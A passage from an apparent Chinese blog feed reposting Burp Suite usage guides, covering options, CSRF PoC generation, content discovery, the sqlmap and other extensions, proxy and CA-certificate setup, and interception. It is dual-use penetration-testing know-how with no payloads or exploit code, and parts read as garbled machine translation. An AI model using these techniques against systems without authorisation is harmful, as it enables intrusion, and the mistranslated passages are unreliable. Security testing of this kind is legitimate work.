title="image027.png"></p><p>HTTP头始终显示在原料的形式 - 字符集编码选项只适用于邮件正文中。<br>需要注意的是所需的一些字符集的字形不支持的所有字体。如果你需要使用一个扩展的或不寻常的字符集，你应该首先尝试进行系统的字体，如宋体或Dialog。</p><h3 id="HTML-rendering"><a href="#HTML-rendering" class="headerlink" title="HTML rendering"></a>HTML rendering</h3><p>Html rendering是html转义的意思，渲染HTTP消息编辑器显示HTML内容中标签约，因为它会出现在你的浏览器。该选项控制Burp是否会作出所需要的完全呈现HTML内容（例如，用于嵌入式图像）的任何额外的HTTP请求。使用此选项涉及的速度和HTML渲染质量之间的权衡，以及您是否希望避免作出任何进一步的请求到目标应用程序。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085262418.png" alt="Image029" title="image029.png"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>此选项卡包含的设置hotkeys(热键)，logging(记录)，temporary files(临时文件)的位置，automatic backup(自动备份)和scheduled tasks(预定的任务)。</p><h3 id="Hotkeys"><a href="#Hotkeys" class="headerlink" title="Hotkeys"></a>Hotkeys</h3><p>设置允许您配置快捷键为常用操作。许多类型的动作可以被分配一个快捷键，在以下类别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1)特定于某个HTTP请求或响应的动作，例如“send to repeater(发送到转发器)”。  </span><br><span class="line">2)全球行动，如“Switch to proxy(切换到代理服务器)”。  </span><br><span class="line">3)在编辑操作，如“剪切”和“撤消”。  </span><br></pre></td></tr></table></figure><p>一些热键的默认配置。需要注意的是如果你使用它们频繁，可以给它们分配一个快捷键。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085215878.png" alt="Image031" title="image031.png"></p><p>所有的快捷键必须使用控制键（或在OSX上的Command键），也可以使用Shift和其他可用的修饰符。请注意，在某些Windows安装中的Ctrl + Alt组合是由Windows视为等同于键AltGr，并可能导致输入的字符时，在文本字段中压显现出来。</p><h3 id="Logging"><a href="#Logging" class="headerlink" title="Logging"></a>Logging</h3><p>设置控制HTTP请求和响应的记录。可以记录每个工具或所有Burp流量进行配置。选择你要记录的，会弹出一个框让你选择保存的地方，可以在扫描的时候把扫描的一些扫描记录下来，然后放到sqlmap里进行跑，很淫荡的想法。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085218049.png" alt="Image033" title="image033.png"></p><h3 id="Temporary-Files-Location"><a href="#Temporary-Files-Location" class="headerlink" title="Temporary Files Location"></a>Temporary Files Location</h3><p>保存一些零时文件的地方，可以设置系统默认，也可以自定义路径。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085220116.png" alt="Image035" title="image035.png"></p><h3 id="Automatic-backup"><a href="#Automatic-backup" class="headerlink" title="Automatic backup"></a>Automatic backup</h3><p>自动备份功能。设置允许您配置Burp保存的所有工具’的状态和配置的备份每隔多少分钟，并且还可以选择退出。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085371527.png" alt="Image037" title="image037.png"></p><p>使用这些选项意味着你一般都会有你的工作，最近的备份副本在Burp异常退出的事件。如果您已配置目标范围为你的工作，你可以使用“include in-scope items only(仅仅包括在范围内的项目)”以减少数据必须保存量。</p><h3 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h3><p>计划任务。仅限专业版使用，您可以使用任务调度程序自动启动和停止某些任务在规定的时间和间隔时间。您可以使用任务计划程序来启动和停止某些自动化任务了几个小时，而你没有工作，并定期或在特定时间保存您的工作。要使用此功能，请选择在Burp的任何地方一个HTTP请求，或任何部分目标站点地图，并在上下文菜单中的“Engagement(参与工具)”中选择“Schedule task(计划任务)” 。或者，您也可以通过在计划任务面板中直接添加一个新的任务。创建一个新的任务将打开一个向导，可以配置任务的详细信息。<br>任务计划有以下类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1）从URL扫描  </span><br><span class="line">2）暂停主动扫描  </span><br><span class="line">3）继续主动扫描  </span><br><span class="line">4）从URL蜘蛛  </span><br><span class="line">5）暂停蜘蛛  </span><br><span class="line">6）保存状态  </span><br></pre></td></tr></table></figure><p>根据任务的类型，您还可以配置一个URL （如扫描）或文件（如保存状态） 。每一个任务需要有配置了启动时间。或者，您可以配置任务重复在定义的时间间隔。</p><h2 id="Suite-functions"><a href="#Suite-functions" class="headerlink" title="Suite functions"></a>Suite functions</h2><hr><h3 id="Generate-CSRF-POC"><a href="#Generate-CSRF-POC" class="headerlink" title="Generate CSRF POC"></a>Generate CSRF POC</h3><p>[专业版]此功能可用于生成一个证明了概念验证（PoC ）跨站点请求伪造（CSRF ）攻击对于一个给定的请求。要使用此功能，请选择在Burp的任何地方URL或HTTP请求，并选择上下文菜单中的“Engagement tools(参与工具)”中的“Generate CSRF Poc(生成CSRF的一键通)”。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085352303.png" alt="Image039" title="image039.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101712085425721.png" alt="Image041" title="image041.png"></p><p>Burp显示了在顶部面板中选择的完整的请求，并将生成的HTML CSRF在较低的面板。在HTML使用的形式和&#x2F;或JavaScript来生成在浏览器中所要求的请求。您可以手动编辑的要求，并单击“regenerate(重新生成)”按钮，根据更新的要求来重新生成CSRF的HTML 。你可以测试生成的PoC的效果在浏览器中，使用“测试中的浏览器”按钮。当您选择此选项，可以粘贴到浏览器（配置为使用Burp的当前实例作为其代理）一个唯一的URL 。由此产生的浏览器请求由服务Burp与当前显示的HTML，然后你可以决定的PoC是否是通过监测得到的请求（ s）表示，通过代理服务器进行了卓有成效的。</p><h3 id="Message-Editor"><a href="#Message-Editor" class="headerlink" title="Message Editor"></a>Message Editor</h3><p>HTTP消息编辑器是用于整个Burp查看和编辑的HTTP请求和响应。以及显示原始消息本身，编辑器包括大量的功能，帮助您快速进一步分析这些消息，推动Burp的核心工作流程，以及进行其他有用的任务。</p><h3 id="Content-Discovery"><a href="#Content-Discovery" class="headerlink" title="Content Discovery"></a>Content Discovery</h3><p>此功能可用于发现内容并不会从您可以浏览或蜘蛛可见内容链接功能。<br>要使用此功能，请选择在Burp的任何地方一个HTTP请求，或任何部分目标站点地图，并在上下文菜单中的“参与工具”中选择“查找内容”。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085426974.png" alt="Image043" title="image043.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101712085427081.png" alt="Image045" title="image045.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101712085436131.png" alt="Image047" title="image047.png"></p><p>Burp使用各种技术来发现内容，包括姓名猜测，网络蜘蛛，并且从命名的应用程序中使用的观测约定外推。发现的内容被显示在一个特殊的网站地图是特定的发现会话，并且还可以任选地加入到suite site map。</p><h3 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h3><p>此选项卡显示您发现会话的当前状态。切换按钮指示是否会话正在运行，并允许您暂停和重新启动会话。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085493754.png" alt="Image049" title="image049.png"></p><p>下面的信息则显示该发现会话的进展：提出的要求数在服务器响应传输的字节数网络错误数排队的发现任务数蜘蛛排队的请求数排队分析响应数排队的个人发现任务都显示在表格中。发现引擎的工作原理递归，当一个新的目录或文件被发现，进一步的任务是源于此，这取决于配置。</p><h3 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h3><p>这些选项可让您定义了内容发现会话启动目录，以及是否文件或目录要有针对性。下列选项可用：<br>Start directory(启动目录) - 这就是Burp就会开始寻找内容的位置。这条道路及其子目录内只有项目将在会议期间提出要求。<br>Discover(发现) - 此选项确定会话是否将寻找文件或目录，或两者兼而有之。如果你正在检查的目录，你可以选择是否以及如何深递归到子目录中发现的。</p><h3 id="Filenames"><a href="#Filenames" class="headerlink" title="Filenames"></a>Filenames</h3><p>这些选项可让您配置Burp应该使用生成的文件名来测试源。下列选项可用<br>内置的短文件列表 、内置短路目录列表 、内置长文件列表 、内置长目录列表<br>发现在目标站点上使用的名称。如果选择此选项，Burp会维护所有的目录和文件名茎已发现的目标网站上的名单，也将检查这些在测试每一个新的目录。<br>根据发现的物品推导。如果选择此选项，Burp会尝试猜测基于那些已经被发现的项目名称。例如，如果该目录AnnualReport2011被发现，Burp也将检查AnnualReport2012，AnnualReport2013等。</p><h3 id="File-Extensions"><a href="#File-Extensions" class="headerlink" title="File Extensions"></a>File Extensions</h3><p>控制如何发现会话添加文件扩展名，正在测试。该文件的本身是根据文件名选择导出。当每个文件的在测试时，Burp会检查各种不同的扩展名，根据这些设置。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)Test these extensions(测试这些扩展)- 此选项可让您设定的扩展，Burp会经常检查清单。你可以微调的基础上已知在对目标应用程序中使用的技术，默认列表。  </span><br><span class="line">2)Test all extensions observed on target site(测试目标点观测到的所有分机) - 如果选择此选项，然后Burp会自动检查是否存在已在使用中被观察到目标站点上的文件扩展名。此选项很有用，当你不知道到底是什么扩展或技术都在使用。您还可以配置你不想要检查，即使发现是在使用中（如图像文件）的扩展名列表。  </span><br><span class="line">3)Test these variant exxtensions on discovered files(在测试文件中发现这些变异扩展) - 此选项可让您设定的扩展名列表的Burp会额外检查以便发现文件名。这个选项是检查现有的文件的备份副本很有用。  </span><br><span class="line">4)Test filestemswith no extension(测试文件无扩展名) - 如果选择此选项，Burp会为每个文件检查不带扩展名添加。  </span><br></pre></td></tr></table></figure><h3 id="Discovery-Engine"><a href="#Discovery-Engine" class="headerlink" title="Discovery Engine"></a>Discovery Engine</h3><p>用于发现内容时发出HTTP请求的引擎，并带有套房站点地图互动。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)Case sensitivity(区分大小写) - 这个设置控制Burp是否会处理文件名的情况下，敏感。如果选择“自动检测”被选中，然后Burp会通过处理文件名的情况下灵敏启动，并在发现的第一个新项目，将测试情况变化的服务器的处理。根据所治疗，Burp可能恢复到处理文件名的情况下不区分大小写。  </span><br><span class="line">2)Add discovered content to suite site map(发现添加内容到套房站点地图) - 如果选择此选项，然后在当前会话的发现确定了新的项目将被自动添加到主浴室的站点地图。  </span><br><span class="line">3)Copy content from suite site map(复制主站点地图的内容) - 如果选择此选项，则发现会话将复制任何现有的相关内容从主套房站点地图进去发现网站地图，以提供发现新的内容较强的出发基础。  </span><br><span class="line">4)Number of discovery threads(蜘蛛从已发现的内容) - 如果选择此选项，则发现会话将执行常规的网络蜘蛛，并且将处理响应发现请求寻找链接到其他新的内容。发现执行绪数目 - 此选项控制并发请求数的发现引擎能够作出。蜘蛛线程数 - 该选项控制并发请求数的蜘蛛功能是能够使，如果启用。  </span><br></pre></td></tr></table></figure><h3 id="Site-map"><a href="#Site-map" class="headerlink" title="Site map"></a>Site map</h3><p>该发现会话使用自己的站点地图，显示所有已发现的定义范围内的所有内容。如果您已配置Burp的话，新发现的项目也将被添加到Burp的主要站点地图。</p><h3 id="Alert"><a href="#Alert" class="headerlink" title="Alert"></a>Alert</h3><p>用来显示当前Burp的扫描代理的一些状态，这个没什么介绍的。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085422622.png" alt="Image051" title="image051.png"></p><h2 id="Burp-Sqlmap插件"><a href="#Burp-Sqlmap插件" class="headerlink" title="Burp Sqlmap插件"></a>Burp Sqlmap插件</h2><hr><p>SqlMap是一个开源渗透测试工具，它可以自动检测和利用SQL注入漏洞和接管数据库服务器的过程。它配备了一个功能强大的检测引擎，许多利基功能，为最终的渗透测试和广泛的交换机从数据库中指纹持久的，在数据从数据库中获取，通过访问底层文件系统和操作系统上执行命令的输出带外连接。如图效果图</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085481646.png" alt="Image053" title="image053.png"></p><h3 id="0x01-环境及工具"><a href="#0x01-环境及工具" class="headerlink" title="0x01 环境及工具"></a>0x01 环境及工具</h3><p>需要python、java环境，并且需要下载sqlmap.py、gason.jar插件。</p><p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p><p><a href="http://www.praetorian.com/tools/gason-0.9.6.jar">http://www.praetorian.com/tools/gason-0.9.6.jar</a></p><h3 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h3><h4 id="1）选择Burp-Extender扩展添加"><a href="#1）选择Burp-Extender扩展添加" class="headerlink" title="1）选择Burp Extender扩展添加"></a>1）选择Burp Extender扩展添加</h4><p><img src="https://wooyun.js.org/images_result/images/2014101712085529316.png" alt="Image055" title="image055.png"></p><h4 id="2）添加成功会提示加载成功，然后在任意的Burp请求地址的详情里右击"><a href="#2）添加成功会提示加载成功，然后在任意的Burp请求地址的详情里右击" class="headerlink" title="2）添加成功会提示加载成功，然后在任意的Burp请求地址的详情里右击"></a>2）添加成功会提示加载成功，然后在任意的Burp请求地址的详情里右击</h4><p><img src="https://wooyun.js.org/images_result/images/2014101712085637348.png" alt="Image057" title="image057.png"></p><h4 id="3）接下来会出现gui-界面，要是用还必须加载sqlmap-py的路径"><a href="#3）接下来会出现gui-界面，要是用还必须加载sqlmap-py的路径" class="headerlink" title="3）接下来会出现gui 界面，要是用还必须加载sqlmap.py的路径"></a>3）接下来会出现gui 界面，要是用还必须加载sqlmap.py的路径</h4><p><img src="https://wooyun.js.org/images_result/images/2014101712085666464.png" alt="Image059" title="image059.png"></p><p>图形界面挺不错的，对于使用sqlmap新手挺好的，有时候使用命令界面的时候不知道命令了可以用这个图形界面查看命令怎样使用，比如：我不知道怎么在后面加数据库参数，则可以如下图所示</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085640119.png" alt="Image061" title="image061.png"></p><h3 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h3><p>如上有地址参数了在右下角点击run即可，图形界面就不做过多的介绍了，其使用方法和sqlmap命令界面是一样的，主要是结合了burp唯一的好处就是用burp检测到注入了然后可以直接发送到sqlmap进行注入。而且操作简单。</p><h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h3><h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>在Notes选项卡中，您可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 储存注意事项：储存任何目前开启的文件到一个文件中。  </span><br><span class="line">- 负载注：从文件加载以前保存的一套纸币。  </span><br><span class="line">- 新文本：添加一个标签一个新的文本文档。  </span><br><span class="line">- 导入文本：加载一个文本文件的内容。  </span><br><span class="line">- 新的电子表格：添加一个标签一个新的电子表格。  </span><br><span class="line">- 导入电子表格：加载一个CSV文件的内容。  </span><br><span class="line">- 您还可以导出单个音符的标签到外部文件。 </span><br></pre></td></tr></table></figure><p>界面如下：</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085766328.png" alt="Image063" title="image063.png"></p><h3 id="0x02-安装-1"><a href="#0x02-安装-1" class="headerlink" title="0x02 安装"></a>0x02 安装</h3><p>在Burp主界面Extender&gt;&gt;Extensions&gt;&gt;Burp Extensions下的add按钮</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085745072.png" alt="Image065" title="image065.png"></p><h4 id="0x03-使用-1"><a href="#0x03-使用-1" class="headerlink" title="0x03 使用"></a>0x03 使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)可以从Burp主界面的Proxy history里选择发送到notes。  </span><br><span class="line">2)切换到notes标签选项卡即可。  </span><br><span class="line">3)Save notes(保存文本)  </span><br><span class="line">4)也可以导入文本和表格文件  </span><br></pre></td></tr></table></figure><h2 id="JSBeautifier"><a href="#JSBeautifier" class="headerlink" title="JSBeautifier"></a>JSBeautifier</h2><h3 id="0x01-介绍-1"><a href="#0x01-介绍-1" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>大多数的网站压缩其资源，如JS文件，以便增加装载速度。然而，安全性测试和调试一个压缩的资源是不容易的事。这是一个Burp开源扩展，这使得它可以美化大部分资源。因此，这将有助于Web应用程序安全研究人员查看压缩资源更容易。它还可以帮助他们有足够的资源内的浏览器解压缩后的版本（如JS，CSS，HTML，XML，等等）。</p><h3 id="0x02安装"><a href="#0x02安装" class="headerlink" title="0x02安装"></a>0x02安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1）下载jsbeautifier.jar 文件和libs目录  </span><br><span class="line">2）点击Extender&gt;&gt;add选择jsbeautifier.jar</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101712085835329.png" alt="Image067" title="image067.png"></p><h3 id="0x03-使用-2"><a href="#0x03-使用-2" class="headerlink" title="0x03 使用"></a>0x03 使用</h3><p>直接勾选或者在响应请求选择beautify this!即可</p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite使用介绍（一）</title>
      <link href="/smallhao/Suite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/smallhao/Suite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<hr><p>Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。本文主要介绍它的以下特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.Target(目标)——显示目标目录结构的的一个功能</span><br><span class="line">2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</span><br><span class="line">3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</span><br><span class="line">4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</span><br><span class="line">5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</span><br><span class="line">6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</span><br><span class="line">7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</span><br><span class="line">8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。</span><br><span class="line">9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</span><br><span class="line">10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</span><br><span class="line">11.Options(设置)——对Burp Suite的一些设置</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="测试工作流程"><a href="#测试工作流程" class="headerlink" title="测试工作流程"></a>测试工作流程</h2><p>Burp支持手动的Web应用程序测试的活动。它可以让你有效地结合手动和自动化技术，使您可以完全控制所有的BurpSuite执行的行动，并提供有关您所测试的应用程序的详细信息和分析。 让我们一起来看看Burp Suite的测试流程过程吧。 如下图</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120074380.png" alt="Image001" title="image001.png"></p><h2 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h2><p>代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动，在一个典型的测试中，侦察和分析阶段包括以下任务：</p><p>手动映射应用程序-使用浏览器通过BurpSuite代理工作，手动映射应用程序通过以下链接，提交表单，并通过多步骤的过程加强。这个过程将填充代理的历史和目标站点地图与所有请求的内容，通过被动蜘蛛将添加到站点地图，可以从应用程序的响应来推断任何进一步的内容(通过链接、表单等)。也可以请求任何未经请求的站点(在站点地图中以灰色显示的)，并使用浏览器请求这些。</p><p>在必要是执行自动映射-您可以使用BurpSuite自动映射过程中的各种方法。可以进行自动蜘蛛爬行，要求在站点地图未经请求的站点。请务必在使用这个工具之前，检查所有的蜘蛛爬行设置。</p><p>使用内容查找功能发现，可以让您浏览或蜘蛛爬行可见的内容链接以进一步的操作。</p><p>使用BurpSuite Intruder(入侵者)通过共同文件和目录列表执行自定义的发现，循环，并确定命中。</p><p>注意，在执行任何自动操作之前，可能有必要更新的BurpSuite的配置的各个方面，诸如目标的范围和会话处理。</p><p>分析应用程序的攻击面 - 映射应用程序的过程中填入代理服务器的历史和目标站点地图与所有的BurpSuite已抓获有关应用程序的信息。这两个库中包含的功能来帮助您分析它们所包含的信息，并评估受攻击面的应用程序公开。此外，您可以使用BurpSuite的目标分析器报告的攻击面的程度和不同类型的应用程序使用的URL 。</p><p>接下来主要介绍下BurpSuite的各个功能吧。先介绍Proxy功能，因为Proxy起到一个心脏功能，所有的应用都基于Proxy的代理功能。</p><h2 id="Burp-Suite功能按钮键翻译对照"><a href="#Burp-Suite功能按钮键翻译对照" class="headerlink" title="Burp Suite功能按钮键翻译对照"></a>Burp Suite功能按钮键翻译对照</h2><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>### 导航栏</td><td></td><td></td><td></td></tr><tr><td>Burp</td><td>BurpSuite</td><td>save state wizard</td><td>保存状态向导</td></tr><tr><td>restore state</td><td>恢复状态</td><td>Remember setting</td><td>记住设置</td></tr><tr><td>restore defaults</td><td>恢复默认</td><td>Intruder</td><td>入侵者</td></tr><tr><td>Start attack</td><td>开始攻击(爆破)</td><td>Actively scan defined insertion points</td><td>定义主动扫描插入点</td></tr><tr><td>Repeater</td><td>中继器</td><td>New tab behavior</td><td>新标签的行为</td></tr><tr><td>Automatic payload positions</td><td>自动负载位置</td><td>config predefined payload lists</td><td>配置预定义的有效载荷清单</td></tr><tr><td>Update content-length</td><td>更新内容长度</td><td>unpack gzip&#x2F;deflate</td><td>解压gzip&#x2F;放弃</td></tr><tr><td>Follow redirections</td><td>跟随重定向</td><td>process cookies in redirections</td><td>在重定向过程中的cookies</td></tr><tr><td>View</td><td>视图</td><td>Action</td><td>行为</td></tr><tr><td>### 功能项</td><td></td><td></td><td></td></tr><tr><td>Target</td><td>目标</td><td>Proxy</td><td>代理</td></tr><tr><td>Spider</td><td>蜘蛛</td><td>Scanner</td><td>扫描</td></tr><tr><td>Intruder</td><td>入侵者</td><td>Repeater</td><td>中继器</td></tr><tr><td>Sequencer</td><td>定序器</td><td>Decoder</td><td>解码器</td></tr><tr><td>Comparer</td><td>比较器</td><td>Extender</td><td>扩展</td></tr><tr><td>Options</td><td>设置</td><td>Detach</td><td>分离</td></tr><tr><td>Filter</td><td>过滤器</td><td>SiteMap</td><td>网站地图</td></tr><tr><td>Scope</td><td>范围</td><td>Filter by request type</td><td>通过请求过滤</td></tr><tr><td>Intercept</td><td>拦截</td><td>response Modification</td><td>响应修改</td></tr><tr><td>match and replace</td><td>匹配和替换</td><td>ssl pass through</td><td>SSL通过</td></tr><tr><td>Miscellaneous</td><td>杂项</td><td>spider status</td><td>蜘蛛状态</td></tr><tr><td>crawler settings</td><td>履带式设置</td><td>passive spidering</td><td>被动蜘蛛</td></tr><tr><td>form submission</td><td>表单提交</td><td>application login</td><td>应用程序登录</td></tr><tr><td>spider engine</td><td>蜘蛛引擎</td><td>scan queue</td><td>扫描队列</td></tr><tr><td>live scanning</td><td>现场扫描</td><td>live active scanning</td><td>现场主动扫描</td></tr><tr><td>live passive scanning</td><td>现场被动扫描</td><td>attack insertion points</td><td>攻击插入点</td></tr><tr><td>active scanning optimization</td><td>主动扫描优化</td><td>active scanning areas</td><td>主动扫描区域</td></tr><tr><td>passive scanning areas</td><td>被动扫描区域</td><td>Payload</td><td>有效载荷</td></tr><tr><td>payload processing</td><td>有效载荷处理</td><td>select live capture request</td><td>选择现场捕获请求</td></tr><tr><td>token location within response</td><td>内响应令牌的位置</td><td>live capture options</td><td>实时捕捉选项</td></tr><tr><td>Manual load</td><td>手动加载</td><td>Analyze now</td><td>现在分析</td></tr><tr><td>Platform authentication</td><td>平台认证</td><td>Upstream proxy servers</td><td>上游代理服务器</td></tr><tr><td>Grep Extrack</td><td>提取</td><td></td><td></td></tr></tbody></table><h1 id="Proxy功能"><a href="#Proxy功能" class="headerlink" title="Proxy功能"></a>Proxy功能</h1><hr><p>Burp Proxy相当于BurpSuite的心脏，通过拦截，查看和修改所有的请求和响应您的浏览器与目标Web服务器之间传递。 下面了解有关BurpProxy：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120067021.png" alt="Image003" title="image003.png"></p><h2 id="Using-BurpProxy-http、https"><a href="#Using-BurpProxy-http、https" class="headerlink" title="Using BurpProxy http、https"></a>Using BurpProxy http、https</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>设置代理的方法：以http ie为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工具&gt;&gt;Internet选项&gt;&gt;连接&gt;&gt;局域网&gt;&gt;勾选代理服务器填写地址127.0.0.1端口8080</span><br></pre></td></tr></table></figure><p>这里端口可以随便定义但是要跟burp的监听端口要一致然后保存再到Proxy的Options中添加add</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120062713.jpg" alt="Image005" title="image005.jpg"></p><p><img src="https://wooyun.js.org/images_result/images/2014101711120053086.jpg" alt="Image007" title="image007.jpg"></p><p>这样http协议的监听就可以了,当intercept is on表示开启拦截功能，反之</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120574272.jpg" alt="Image009" title="image009.jpg"></p><p>这样就代表拦截成功，我们可以右击send to Repeater去修改数据再发送，也可以右击改变提交请求方式(change request method)比如get或者post等功能</p><h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.以管理员权限运行ie浏览器</span><br><span class="line">2.像http那样配置好代理 </span><br><span class="line">3.在地址栏访问https地址，单击继续 </span><br><span class="line">4.点击错误证书在这个地址栏 </span><br><span class="line">5.点击查看证书 </span><br><span class="line">6.在证书路径选项卡点击PortSwigger CA,然后再点击查看证书 </span><br><span class="line">7.在常规选项卡里点击安装证书 </span><br><span class="line">8.在证书导入向导中，选择“将所有的证书放入下列存储区” </span><br><span class="line">9.点击浏览 </span><br><span class="line">10.以当前用户或者本机计算机都可以 </span><br><span class="line">11.点击ok完成导入 </span><br><span class="line">12.重启ie（不需要以管理员权限运行） 其它浏览器差不多具体请查看官网 </span><br></pre></td></tr></table></figure><p><a href="http://portswigger.net/burp/Help/proxy_options_installingCAcert.html">http://portswigger.net/burp/Help/proxy_options_installingCAcert.html</a></p><h3 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h3><p>用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。 该面板还包含以下控制：</p><h4 id="Forward"><a href="#Forward" class="headerlink" title="Forward"></a>Forward</h4><p>当你编辑信息之后，发送信息到服务器或浏览器</p><h4 id="Drop"><a href="#Drop" class="headerlink" title="Drop"></a>Drop</h4><p>当你不想要发送这次信息可以点击drop放弃这个拦截信息</p><h4 id="Interception-is-on-off"><a href="#Interception-is-on-off" class="headerlink" title="Interception is on&#x2F;off"></a>Interception is on&#x2F;off</h4><p>这个按钮用来切换和关闭所有拦截。如果按钮显示Interception is On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。</p><h4 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h4><p>说明一个菜单可用的动作行为操作可以有哪些操作功能。</p><h4 id="Comment-field"><a href="#Comment-field" class="headerlink" title="Comment field"></a>Comment field</h4><p>为请求或响应添加注释，以便更容易在History选项卡中识别它们。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120578170.png" alt="Image011" title="image011.png"></p><h4 id="Highlight"><a href="#Highlight" class="headerlink" title="Highlight"></a>Highlight</h4><p>为请求或响应添加颜色，可以在history选项卡和截获中更容易发现。</p><p><img 